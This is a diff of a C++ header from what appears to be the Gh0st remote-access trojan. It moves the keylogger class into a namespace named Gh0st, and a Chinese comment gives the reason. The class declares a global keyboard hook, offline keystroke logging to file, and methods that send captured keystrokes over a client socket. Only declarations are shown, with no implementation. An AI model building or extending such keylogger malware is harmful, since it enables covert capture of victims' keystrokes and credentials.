@@ -145,28 +145,32 @@ protected:
 	SECURITY_DESCRIPTOR sd;
 };
 
-// 由于CKeyboardManager与系统的类重名，因此添加Gh0st作区分
-class CGh0stKeyboardManager : public CManager
-{
-public:
-	CGh0stKeyboardManager(CClientSocket *pClient);
-	virtual ~CGh0stKeyboardManager();
-	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
-	static bool StartHook();
-	static void StopHook();
-	static bool Initialization();
+// 由于CKeyboardManager与系统的类重名，因此添加命名空间Gh0st作区分
+namespace Gh0st {
 
-	static HINSTANCE g_hInstance;
-	static DWORD m_dwLastMsgTime;
-	static TShared* m_pTShared;
-	static HANDLE m_hMapping_File;
-private:
-	static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
-	static void SaveInfo(const char *lpBuffer);
-	static void SaveToFile(const char *lpBuffer);
-	int sendOfflineRecord();
-	int sendStartKeyBoard();
-	int sendKeyBoardData(LPBYTE lpData, UINT nSize);
-};
+	class CKeyboardManager : public CManager
+	{
+	public:
+		CKeyboardManager(CClientSocket *pClient);
+		virtual ~CKeyboardManager();
+		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
+		static bool StartHook();
+		static void StopHook();
+		static bool Initialization();
+
+		static HINSTANCE g_hInstance;
+		static DWORD m_dwLastMsgTime;
+		static TShared *m_pTShared;
+		static HANDLE m_hMapping_File;
+	private:
+		static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
+		static void SaveInfo(const char *lpBuffer);
+		static void SaveToFile(const char *lpBuffer);
+		int sendOfflineRecord();
+		int sendStartKeyBoard();
+		int sendKeyBoardData(LPBYTE lpData, UINT nSize);
+	};
+
+}
 
 #endif // !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
